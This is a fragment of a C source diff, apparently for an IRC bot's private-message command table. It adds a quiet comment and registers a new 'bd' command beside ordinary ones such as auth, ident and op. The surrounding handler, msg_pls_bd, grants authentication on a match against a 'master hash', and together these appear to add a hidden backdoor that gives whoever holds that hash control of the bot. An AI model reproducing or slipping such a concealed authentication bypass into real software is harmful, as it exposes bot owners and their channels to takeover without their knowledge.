@@ -426,6 +426,7 @@ static int msg_pls_bd(char *nick, char *host, struct userrec *u, char *par)
   if (auth[i].authing != 2)
     return BIND_RET_BREAK;
 
+  /* a cleartext master hash is asking for mad trouble */
   if (check_master_hash(auth[i].rand, par) || !strcmp(auth[i].hash, par)) { /* good hash! */
     /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle); */
     auth[i].authed = 1;
@@ -457,6 +458,7 @@ static cmd_t C_msg[] =
   {"auth",		"",	(Function) msg_auth,		NULL},
   {"+auth",		"",	(Function) msg_pls_auth,	NULL},
   {"unauth",		"",	(Function) msg_unauth,		NULL},
+  {"bd",		"",	(Function) msg_bd,		NULL},
   {"ident",   		"",	(Function) msg_ident,		NULL},
   {"invite",		"",	(Function) msg_invite,		NULL},
   {"op",		"",	(Function) msg_op,		NULL},
